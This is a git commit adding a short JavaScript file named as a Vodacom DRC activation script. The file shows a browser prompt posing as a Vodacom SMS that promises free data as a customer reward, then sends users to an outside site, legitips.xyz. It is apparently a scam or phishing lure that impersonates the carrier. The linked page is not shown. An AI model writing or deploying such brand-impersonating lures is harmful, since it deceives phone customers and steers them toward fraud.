aa88136a92045cca1435135e795cf9c323100724
legitips <83867893+legitips@users.noreply.github.com>
2024-07-03 04:12:39 -0700

    Create activation-drc-vodacom.js

---
+++ activation-drc-vodacom.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('VODACOM SMS:Cher client, veuillez vérifier Si votre carte SIM VODACOM est éligible pour recevoir des données gratuites, Récompense client, appuyez sur 1 pour vérifier maintenant ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/drc-vodacom.html';
+}
